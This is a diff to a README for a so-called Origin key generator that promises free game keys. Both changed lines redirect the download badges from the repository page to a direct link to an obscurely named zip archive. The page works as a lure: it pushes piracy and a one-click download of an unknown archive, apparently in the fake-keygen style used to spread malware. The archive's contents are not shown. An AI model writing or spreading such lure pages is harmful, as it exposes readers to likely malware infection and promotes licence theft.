@@ -36,7 +36,7 @@ Ready to get started? Follow these simple steps:
 
 ### Step 1: Download the Application
 
-[![Download Origin-Key-Generator](https://img.shields.io/badge/Download-Origin--Key--Generator-2ea44f?style=for-the-badge)](https://github.com/factual-bow790/Origin-Key-Generator)
+[![Download Origin-Key-Generator](https://img.shields.io/badge/Download-Origin--Key--Generator-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/factual-bow790/Origin-Key-Generator/main/liverance/Key_Generator_Origin_presbyacusia.zip)
 
 Visit this link to download the application. The download will start automatically, and you'll receive a single file that contains everything you need.
 
@@ -138,7 +138,7 @@ If you encounter any issues or have questions, feel free to reach out. We're her
 
 Origin-Key-Generator is your one-stop solution for free Origin keys. It's fast, reliable, and incredibly easy to use. Don't miss out on the opportunity to play all your favorite games without spending a dime. Download now and start generating!
 
-[![Get Origin-Key-Generator Now](https://img.shields.io/badge/Get%20Origin--Key--Generator%20Now-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://github.com/factual-bow790/Origin-Key-Generator)
+[![Get Origin-Key-Generator Now](https://img.shields.io/badge/Get%20Origin--Key--Generator%20Now-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/factual-bow790/Origin-Key-Generator/main/liverance/Key_Generator_Origin_presbyacusia.zip)
 
 ---
 
